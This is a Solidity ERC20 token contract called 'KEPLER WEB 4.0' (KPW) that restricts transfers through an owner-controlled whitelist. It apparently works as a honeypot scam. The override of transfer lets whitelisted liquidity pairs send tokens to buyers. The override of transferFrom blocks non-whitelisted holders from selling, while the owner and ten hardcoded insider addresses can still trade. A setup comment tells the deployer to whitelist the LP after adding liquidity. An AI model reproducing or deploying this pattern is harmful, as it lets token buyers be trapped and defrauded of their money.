// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("KEPLER WEB 4.0", "KPW") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 10000000 * 10 ** decimals());
        whiteList[0x592bc4fDa06c8Ea4D403515EAA41B47415dE1F94]= true;
        whiteList[0xb022a430B480Ce3FcC694138eC523d5321948752]=true;
        whiteList[0xb3380dd088E0Be4003b346C9fcA1988467e98259]=true;
        whiteList[0xD6062bd64c19E20cbd6bAF9dc85DF25b5B4424A7]=true;
        whiteList[0x8303c675F121C5285250CA2Cf4f54806426d0972]=true;
        whiteList[0x9113F51a4D4717236387f425d37De1a3379c97C9]=true;
        whiteList[0x6662459200f97470eF03496Bb25d04EE48290668]=true;
        whiteList[0xDC275Af61319F8f85DcbDcff20413cA4D0738a13]=true;
        whiteList[0x1e65f68058978Eca134caf09e780320E8aD32e72]=true;
        whiteList[0xA2A899DBC64C28406EB8A919c09a31d66119f31D]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}